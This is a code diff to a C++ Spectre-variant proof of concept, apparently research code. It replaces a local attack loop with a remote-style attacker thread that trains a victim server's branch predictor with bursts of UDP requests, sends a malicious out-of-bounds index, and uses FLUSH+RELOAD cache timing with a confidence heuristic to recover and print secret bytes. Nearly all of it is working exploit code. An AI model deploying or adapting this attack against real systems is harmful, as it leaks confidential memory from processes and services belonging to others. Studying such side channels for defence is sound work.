@@ -68,11 +68,12 @@ const uint8_t* array2;
 Analysis code
 ********************************************************************/
 /* Default to a cache hit threshold of 80 */
-uint64_t cache_hit_threshold = 80; // TODO: compile-time constexpr...?
+uint64_t cache_hit_threshold = 100;
+constexpr size_t MIN_MEASUREMENTS = 64;
 
-//#define ACCURATE_LATENCIES
+#define ACCURATE_LATENCIES
 #ifdef ACCURATE_LATENCIES
-std::vector< std::array<uint8_t,256> > latency_ts;  // timeseries of access latencies
+std::vector< std::array<uint16_t,256> > latency_ts;  // timeseries of access latencies
 #endif
 std::vector< std::bitset<256> > hit_ts;  // timeseries of line hits
 
@@ -101,150 +102,6 @@ void flush_memory_sse(uint8_t * addr)
 #endif
 
 
-/* Report best guess in value[0] and runner-up in value[1] */
-void readMemoryByte(uint64_t cache_hit_threshold, size_t malicious_x,
-                    uint8_t value[2], int score[2]) {
-  static int results[256];
-  unsigned int junk = 0;
-
-  int j, k;
-  size_t training_x, x;
-
-#ifdef NOCLFLUSH
-  int junk2 = 0;
-#endif
-
-
-  // Clear results:
-  for (int i = 0; i < 256; i++)
-    results[i] = 0;
-
-
-  // Repeat attack 1k times:
-  for (int tries = 999; tries > 0; tries--) {
-#ifndef NOCLFLUSH
-    /* Flush array2[256*(0..255)] from cache */
-    for (int i = 0; i < 256; i++)
-      _mm_clflush( &array2[i*512] ); /* intrinsic for clflush instruction */
-#else
-    /* Flush array2[256*(0..255)] from cache
-       using long SSE instruction several times */
-    for (int j = 0; j < 16; j++)
-      for (int i = 0; i < 256; i++)
-        flush_memory_sse( &array2[i*512] );
-#endif
-
-    training_x = tries % target_len;
-    /* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
-    for (int j = 29; j >= 0; j--) {
-#ifndef NOCLFLUSH
-      _mm_clflush( &target_len );
-#else
-      /* Alternative to using clflush to flush the CPU cache */
-      /* Read addresses at 4096-byte intervals out of a large array.
-         Do this around 2000 times, or more depending on CPU cache size. */
-      for(int l = CACHE_FLUSH_ITERATIONS * CACHE_FLUSH_STRIDE - 1; l >= 0; l -= CACHE_FLUSH_STRIDE) {
-        junk2 = cache_flush_array[l];
-      } 
-#endif
-
-      /* Delay (can also mfence) */
-#ifndef NOMFENCE
-      _mm_mfence();
-#else
-      for (volatile int z = 0; z < 100; z++) {}
-#endif
-
-      /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
-      /* Avoid jumps in case those tip off the branch predictor */
-      x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
-      x = (x | (x >> 16)); /* Set x=-1 if j&6=0, else x=0 */
-      x = training_x ^ (x & (malicious_x ^ training_x));
-
-      /* Call the victim! */
-//      victim_function(x);
-    }
-
-    /* Time reads. Order is lightly mixed up to avoid stride prediction */
-    for (int i = 0; i < 256; i++) {
-      int mix_i = ((i * 167) + 13) & 255;
-      volatile auto* addr = &array2[mix_i * 512];
-
-    /*
-    Accuratly measure memory access to the current index of the
-    array so we can determine which index was cached by the malicious mispredicted code.
-    - The best way to do this is to use the rdtscp instruction, which measures current
-    processor ticks, and is also serialized.
-    */
-      register uint64_t time1, time2;
-#ifndef NORDTSCP
-      time1 = __rdtscp(&junk); /* READ TIMER */
-      junk = *addr; /* MEMORY ACCESS TO TIME */
-      time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
-#else
-    /*
-    The rdtscp instruction was instroduced with the x86-64 extensions.
-    Many older 32-bit processors won't support this, so we need to use
-    the equivalent but non-serialized tdtsc instruction instead.
-    */
-
-#ifndef NOMFENCE
-      /*
-      Since the rdstc instruction isn't serialized, newer processors will try to
-      reorder it, ruining its value as a timing mechanism.
-      To get around this, we use the mfence instruction to introduce a memory
-      barrier and force serialization. mfence is used because it is portable across
-      Intel and AMD.
-      */
-
-      _mm_mfence();
-      time1 = __rdtsc(); /* READ TIMER */
-      _mm_mfence();
-      junk = *addr; /* MEMORY ACCESS TO TIME */
-      _mm_mfence();
-      time2 = __rdtsc() - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
-      _mm_mfence();
-#else
-      /*
-      The mfence instruction was introduced with the SSE2 instruction set, so
-      we have to ifdef it out on pre-SSE2 processors.
-      Luckily, these older processors don't seem to reorder the rdtsc instruction,
-      so not having mfence on older processors is less of an issue.
-      */
-
-      time1 = __rdtsc(); /* READ TIMER */
-      junk = *addr; /* MEMORY ACCESS TO TIME */
-      time2 = __rdtsc() - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
-#endif
-#endif
-      // WHY do we measure, then throw out if mix_i != array[tries%array1_size]?
-///      if (time2 <= cache_hit_threshold && mix_i != array1[tries % array1_size])
-      if (time2 <= cache_hit_threshold)
-        results[mix_i]++; /* cache hit - add +1 to score for this value */
-    }
-
-
-    /* Locate highest & second-highest results results tallies in j/k */
-    j = k = -1;
-    for (int i = 0; i < 256; i++) {
-      if (j < 0 || results[i] >= results[j]) {
-        k = j;
-        j = i;
-      } else if (k < 0 || results[i] >= results[k]) {
-        k = i;
-      }
-    }
-    if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
-      break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
-  }
-  results[0] ^= junk; /* use junk so code above won’t get optimized out*/
-  value[0] = (uint8_t) j;
-  score[0] = results[j];
-  value[1] = (uint8_t) k;
-  score[1] = results[k];
-}
-
-
 inline void flush_array2() {
 #ifndef NOCLFLUSH
     /* Flush array2[256*(0..255)] from cache */
@@ -257,9 +114,17 @@ inline void flush_array2() {
       for (int i = 0; i < 256; i++)
         flush_memory_sse( &array2[i*512] );
 #endif
+
+    /* Delay (can also mfence) */
+#ifndef NOMFENCE
+    _mm_mfence();
+#else
+    for (volatile int z = 0; z < 100; z++) {}
+#endif
 }
 
 
+// TODO: Currently this is being done by the victim.  Need to rework...
 inline void flush_condition() {
 #ifndef NOCLFLUSH
       _mm_clflush( &target_len );
@@ -281,7 +146,7 @@ inline void flush_condition() {
 }
 
 
-// Just time measurement:
+// Measures using the FLUSH+RELOAD side-channel approach:
 void measure_sidechannel(size_t iteration) {
   volatile unsigned int junk = 0;
 
@@ -299,7 +164,7 @@ void measure_sidechannel(size_t iteration) {
     register uint64_t time1, time2;
 #ifndef NORDTSCP
     {
-    unsigned int tmp;
+    register unsigned int tmp;
     time1 = __rdtscp(&tmp); /* READ TIMER */
     junk = *addr; /* MEMORY ACCESS TO TIME */
     time2 = __rdtscp(&tmp) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
@@ -340,16 +205,11 @@ void measure_sidechannel(size_t iteration) {
     time2 = __rdtsc() - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
 #endif
 #endif
-    // WHY do we measure, then throw out if mix_i != array[tries%array1_size]?
-    // - Note, this entire branch can be eliminated
-//      if (time2 <= cache_hit_threshold && mix_i != array1[tries % array1_size])
-//      results[mix_i]++; /* cache hit - add +1 to score for this value */
-//    }
 
     // Record hit and/or latency measurements:
     hit_ts[iteration][mix_i] = time2 <= cache_hit_threshold;
 #ifdef ACCURATE_LATENCIES
-    latency_ts[iteration][mix_i] = static_cast<uint8_t>(time2);
+    latency_ts[iteration][mix_i] = time2;
 #endif
   }
 }
@@ -370,10 +230,6 @@ void init_pages() {
               << SM_HANDLENAME << std::endl;
     exit(EXIT_FAILURE);
   }
-//  if (ftruncate(sm_handle, SM_SIZE) < 0) {
-//    std::cerr << "Error on allocating shared memory of size: "
-//              << SM_SIZE << std::endl;
-//  }
   sm_ptr = static_cast<region*>(
         mmap(NULL, SM_SIZE, PROT_READ, MAP_SHARED, sm_handle, 0) );
   if (sm_ptr == MAP_FAILED) {
@@ -387,6 +243,13 @@ void init_pages() {
   for (size_t i = 0; i < sizeof(region::array2); i += PAGE_SIZE) {
     tmp ^= array2[i];
   }
+
+  // Initialize cache_flush_array to ensure mapping of pages:
+#ifdef NOCLFLUSH
+  for (int i = 0; i < sizeof(cache_flush_array); i++) {
+    cache_flush_array[i] = 1;
+  }
+#endif
 }
 
 void print_config() {
@@ -663,6 +526,225 @@ void send_worker(uint16_t port) {
 }
 
 
+inline void burst_train(SocketUDP& s, size_t training_x = 0) {
+  constexpr size_t BURST_COUNT = 5;
+
+  // Initialize target x to send to victim:
+  msg m = {};
+  m.x = training_x;
+
+  // Send a burst of 5 training (valid) requests:
+  for (size_t i = 0; i < BURST_COUNT; i++) {
+    auto bytes = s.send(&m, sizeof(m));
+    if ( unlikely(!(bytes > 0)) ) {
+      // buffer/send error?
+      std::cerr << "Failed to send training_x: buffer/send error?" << std::endl;
+    }
+  }
+}
+
+
+inline void speculate(SocketUDP& s, size_t malicious_x) {
+  // Send a single request with a malicious request:
+  // Initialize target x to send to victim:
+  msg m = {};
+  m.x = malicious_x;
+
+  // Send a burst of 5 training (valid) requests:
+  auto bytes = s.send(&m, sizeof(m));
+  if ( unlikely(!(bytes > 0)) ) {
+    // buffer/send error?
+    std::cerr << "Failed to send malicious_x: buffer/send error?" << std::endl;
+  }
+}
+
+
+void send_worker_v2(uint16_t port) {
+  // Socket initialization:
+  uint8_t buf[2048];
+  SocketUDP s;
+  assert(s.setRemote(ipv4_addr, port) == 0);
+  std::cout << "["<<port<<"] - Sender worker thread listening." << std::endl;
+
+  size_t measurements = MIN_MEASUREMENTS;
+  std::string secret(target_len, 0);
+
+  constexpr size_t TRAINING_X_MIN = 0;
+  constexpr size_t TRAINING_X_MAX = 16;  // dependant on victim...
+
+  // Next target x to send to victim:
+  size_t malicious_x = target_x_offset;
+
+  size_t tries = 0;
+  for (;;) {
+    // Timeseries intialization:
+    // - reservation avoids memory allocation during side-channel anaylsis.
+    hit_ts.resize(measurements); // Pre-allocate measurement space on heap!
+#ifdef ACCURATE_LATENCIES
+    latency_ts.resize(measurements);
+#endif
+
+
+    // Repeat attack 100 times / byte:
+    // - TODO: replace with a dynamic confidence mechanism?...
+    while (++tries % measurements != 0) {
+      const auto attempt = tries-1;
+      const size_t training_x = attempt % TRAINING_X_MAX;
+
+      // Ensure side-channel array is uncached:
+      flush_array2();
+
+      // Send request to victim:
+      burst_train(s, training_x); // Critical to allow speculation!
+      speculate(s, malicious_x);
+//      std::this_thread::yield();  // yield one sheduler tick (~100 us)
+//      std::this_thread::sleep_for(std::chrono::nanoseconds(10));
+
+      // Wait some amount of time (or for server reply -- but may be too slow):
+//      std::this_thread::sleep_for(std::chrono::microseconds(100));
+      const auto INITIAL_DELAY = std::chrono::microseconds(5);
+
+      // Measure speculative execution's impact on cache:
+      // - measure after a predefined delay (or after event e.g. packet recv.)
+      // - TODO: this does not handle dropped packets (i.e. a real external server)
+      // -- Linux tends to guarantee in-oder and sucessful delivery for localhost
+      msg& m = reinterpret_cast<msg&>(buf);
+      // Wait for confirmation of malicious_x:
+      for (;;) {
+        auto bytes = s.recv(buf, sizeof(buf));  // TODO: Replace me with recvmmsg!
+        if (bytes == sizeof(msg)) {
+          if (m.x == malicious_x) {
+            // Emulates a server error response
+            break;
+          }
+        }
+        else {
+          std::cerr << "Unexpected msg size: " << bytes << std::endl;
+        }
+      }
+
+      measure_sidechannel(attempt);
+
+#ifdef DEBUG
+      std::cout << "training_x: "<< training_x << std::endl;
+      auto hits_idx = sort_indexes(hit_ts.at(attempt));
+      for (size_t idx : hits_idx) {
+#ifdef ACCURATE_LATENCIES
+        const auto hit = latency_ts.at(attempt).at(idx);
+#endif
+        if (!hit_ts.at(attempt).test(idx)) { break; }
+        std::cout << "Byte["<<idx<<"] (" << static_cast<char>(idx) << ")"
+#ifdef ACCURATE_LATENCIES
+                  << ": " << hit << " cycles."
+#endif
+                  << std::endl;
+      }
+#endif
+
+      // Omit training_x used from measurement:
+      // TODO: still don't understand why lines are consistantly off by 1...
+      // expected training_x cache line is actaully training_x+1
+      const auto misaligned_x = training_x+1;  // FIXME...
+#ifdef DEBUG
+      assert(hit_ts.at(attempt).test(misaligned_x));  // not guaranteed, but often true
+#endif
+      hit_ts.at(attempt).reset(misaligned_x);
+#ifdef ACCURATE_LATENCIES
+      latency_ts.at(attempt).at(misaligned_x) = std::numeric_limits<uint16_t>::max();
+#endif
+    }
+
+
+    // Summarize measurements:
+//    std::valarray<uint64_t> counts(uint64_t(0), 256);
+    std::vector<uint64_t> counts(256, uint64_t(0));
+    for (size_t b = 0; b < counts.size(); b++) {
+      // for each measurement, count all bits set:
+      for (size_t t = 0; t < tries; t++) {
+        if (hit_ts[t].test(b)) {
+          counts[b]++;
+        }
+      }
+    }
+    // Output results from attack:
+#ifdef DEBUG
+    std::cout << "Results for target_x_offset: " << malicious_x << '\n';
+#endif
+    auto counts_idx = sort_indexes(counts);
+    for (size_t idx : counts_idx) {
+      const auto hits = counts.at(idx);
+      if (hits == 0) { break; }
+#ifdef DEBUG
+      std::cout << "Byte["<<idx<<"] (" << static_cast<char>(idx) << "): "
+                << hits << " hits." << std::endl;
+#endif
+    }
+
+
+    // Heuristic to calculate confidence:
+    const uint64_t sum = std::accumulate(counts.begin(), counts.end(), 0);
+    const auto best = counts.at(counts_idx[0]);   // best
+    const auto second = counts.at(counts_idx[1]); // second best
+
+    // Is there only one contender?  (picked min threshold 4, out of a hat)
+    bool single_contender = sum == best && sum >= 4;
+    // Is there a majority leader?  (picked signal threshold 2x, out of a hat)
+    bool significant = best >= (second/2) && sum >= 16;
+    // Are we suspicious of Intel's Zero-value predicition on minor page fault?
+    bool zero_value_prediciton = (counts_idx[0] == 0) &&
+                                 !(sum == best && sum >= 2*MIN_MEASUREMENTS);
+
+    // Handle potential minor page fault as needed:
+    if (zero_value_prediciton) {
+      // Retry, doubling the number of measurments:
+      measurements *= 2;
+
+      // Force a TLB hit by triggering
+
+    }
+
+    // Dynamic confidence adjustment:
+    bool confident = single_contender || significant;
+    if (!confident) {
+      // Retry, doubling the number of measurments:
+      measurements *= 2;
+    }
+    else {
+      // Pick the byte with the highest hits:
+      auto idx = counts_idx.at(0);  // byte value from 0 to 255
+      secret.at(malicious_x - target_x_offset) = idx;
+
+      // Output statistics:
+      float confidence = (float(best) / float(sum)) * 100;
+      float observability = (float(best) / measurements) * 100;
+      std::cout << "Offset["<<malicious_x<<"] (" << idx << " : "
+                << static_cast<char>(idx) << "): "
+                << best << '/' << sum << " hits with confidence "
+                << confidence << "%.\n";
+      std::cout << "- Observability: " << observability << "% over "
+                << measurements << " measurements." << std::endl;
+
+      // Reset measurements:
+      tries = 0;
+      measurements = MIN_MEASUREMENTS;
+      hit_ts.clear();
+#ifdef ACCURATE_LATENCIES
+      latency_ts.clear();
+#endif
+
+      if (++malicious_x >= (target_x_offset + target_len)) {
+        break;  // break out of forever loop.
+      }
+    }
+  }
+
+  // Print out secret:
+  std::cout << "Finished reading " << target_len
+            << " bytes at offset " << target_x_offset << ":\n"
+            << make_printable(secret) << std::endl;
+}
+
+
 
 /********************************************************************
 Main.
@@ -689,49 +771,18 @@ int main(int argc, char* const argv[]) {
   std::cout << "Reading " << target_len << " bytes."<< std::endl;
 
 
-  // TODO: What is this doing?
-  #ifdef NOCLFLUSH
-  for (int i = 0; i < sizeof(cache_flush_array); i++) {
-    cache_flush_array[i] = 1;
-  }
-  #endif
-
-
-  // Create a cpu_set_t object representing a set of CPUs. Clear it and mark
-  // only CPU i as set.
+  // Create a cpu_set_t object representing a set of CPUs
+  // - Pin worker thread to same cpu as victim (for now)
   cpu_set_t cpuset;
   CPU_ZERO(&cpuset);
   CPU_SET(1, &cpuset);
 
-  std::thread t(send_worker, udp_port);
+  std::thread t(send_worker_v2, udp_port);
   int rc = pthread_setaffinity_np(t.native_handle(), sizeof(cpuset), &cpuset);
   if (rc != 0) {
     std::cerr << "Error calling pthread_setaffinity_np: " << rc << "\n";
   }
   t.join(); // wait until exits for now...
-
-//  /* Start the read loop to read each address */
-//  auto len = target_size;
-//  auto malicious_x = target_x_offset;
-//  while (--len >= 0) {
-//    int score[2];
-//    uint8_t value[2];
-//    /* Call readMemoryByte with the required cache hit threshold and
-//       malicious x address. value and score are arrays that are
-//       populated with the results.
-//    */
-//    readMemoryByte(cache_hit_threshold, malicious_x++, value, score);
-
-//    /* Display the results */
-//    printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
-//    printf("0x%02X=’%c’ score=%d ", value[0],
-//           (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
-//    if (score[1] > 0) {
-//      printf("(second best: 0x%02X=’%c’ score=%d)", value[1],
-//             (value[1] > 31 && value[1] < 127 ? value[1] : '?'), score[1]);
-//    }
-//    printf("\n");
-//  }
 
   return EXIT_SUCCESS;
 }
